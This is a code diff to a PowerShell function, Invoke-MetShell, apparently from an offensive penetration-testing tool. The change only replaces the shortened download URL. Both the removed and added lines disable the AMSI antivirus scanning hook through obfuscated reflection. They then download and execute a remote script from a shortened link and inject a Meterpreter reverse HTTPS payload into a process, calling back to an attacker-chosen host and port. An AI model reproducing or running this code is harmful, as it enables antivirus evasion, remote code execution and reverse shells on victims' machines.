@@ -69,7 +69,7 @@ function Invoke-MetShell
     if ($env:Processor_Architecture -ne "x86")
     { 
         write-warning 'Run x86 PowerShell'
-        &"c:\Windows\syswow64\windowspowershell\v1.0\powershell.exe" -noni -noprofile -Execution bypass "[Ref].Assembly.GetType('System.M'+'ana'+'gement.Automation.A'+'msi'+'Uti'+'ls').""GetF`ield""('ams'+'iIni'+'tFa'+'iled','Non'+'Public,Static').SetValue(`$null,`$true);iex((New-Object system.net.webclient).DownloadString('https://goo.gl/LpkRps'));Invoke-Mycode -ProcessId $procId -Payload windows/meterpreter/reverse_https -Lhost $lhost -Lport $lport;exit;"
+        &"c:\Windows\syswow64\windowspowershell\v1.0\powershell.exe" -noni -noprofile -Execution bypass "[Ref].Assembly.GetType('System.M'+'ana'+'gement.Automation.A'+'msi'+'Uti'+'ls').""GetF`ield""('ams'+'iIni'+'tFa'+'iled','Non'+'Public,Static').SetValue(`$null,`$true);iex((New-Object system.net.webclient).DownloadString('https://goo.gl/ypak3i'));Invoke-Mycode -ProcessId $procId -Payload windows/meterpreter/reverse_https -Lhost $lhost -Lport $lport;exit;"
     }
     else
     { 
